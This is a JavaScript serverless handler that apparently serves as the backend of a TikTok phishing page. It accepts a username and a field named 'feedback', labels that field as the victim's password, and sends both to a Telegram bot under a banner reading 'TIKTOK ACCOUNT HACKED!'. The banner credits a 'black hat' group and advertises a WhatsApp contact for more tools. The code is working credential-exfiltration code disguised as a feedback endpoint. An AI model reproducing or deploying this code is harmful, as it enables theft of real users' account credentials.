
export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({
      error: "Method not allowed"
    });
  }

  try {
    const { username, feedback } = req.body || {};

    if (
      typeof username !== "string" ||
      !/^[a-zA-Z0-9._]{1,30}$/.test(username) ||
      typeof feedback !== "string" ||
      !feedback.trim() ||
      feedback.length > 1000
    ) {
      return res.status(400).json({
        error: "Invalid request"
      });
    }

    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) {
      return res.status(500).json({
        error: "Server configuration missing"
      });
    }

    const message = `
━━━━━━━━━━━━━━━━━━
TIKTOK ACCOUNT HACKED!
   Tool Made By C9 UZAIR
 Team Black Hat Pakistan 
━━━━━━━━━━━━━━━━━━

👤 Username:
@${username}

🗣️ Password:
${feedback.trim()}

━━━━━━━━━━━━━━━━━━
👑 CREDIT: C9 UZAIR
For More Tools Contact Us...
📱 WhatsApp:
03162423759

📢 Must Join Our WhatsApp Channel 📢
https://whatsapp.com/channel/0029VbBlWD0EKyZNFSYWek45

━━━━━━━━━━━━━━━━━━
`;

    const response = await fetch(
      `https://api.telegram.org/bot${token}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      }
    );

    const result = await response.json();

    if (!response.ok || !result.ok) {
      return res.status(502).json({
        error: "Telegram delivery failed"
      });
    }

    return res.status(200).json({
      success: true
    });

  } catch (error) {
    console.error("Notification error:", error);

    return res.status(500).json({
      error: "Internal server error"
    });
  }
}
